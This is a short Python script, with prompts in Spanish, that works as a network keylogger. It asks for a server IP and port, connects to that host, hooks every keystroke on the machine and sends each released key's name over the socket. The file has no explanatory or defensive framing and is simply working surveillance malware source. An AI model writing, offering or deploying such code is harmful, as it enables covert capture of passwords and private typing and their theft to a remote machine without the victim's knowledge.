import keyboard
import socket
import sys
import signal

# Solicitar la dirección IP del servidor al usuario
host = input("Ingrese la dirección IP del servidor: ")

# Solicitar el puerto al usuario
while True:
    try:
        port = int(input("Ingrese el número de puerto: "))
        break
    except ValueError:
        print("Por favor, ingrese un número válido para el puerto.")

try:
    s = socket.socket()
    s.connect((host, port))
except Exception as e:
    print(f"\n[!] Se ha producido un error en la conexión: {e}\n")
    sys.exit(1)
    s.close()

def on_key_event(event):
    if event.event_type == keyboard.KEY_UP:
        s.send(f"'{event.name}'".encode())

keyboard.hook(on_key_event)
keyboard.wait()
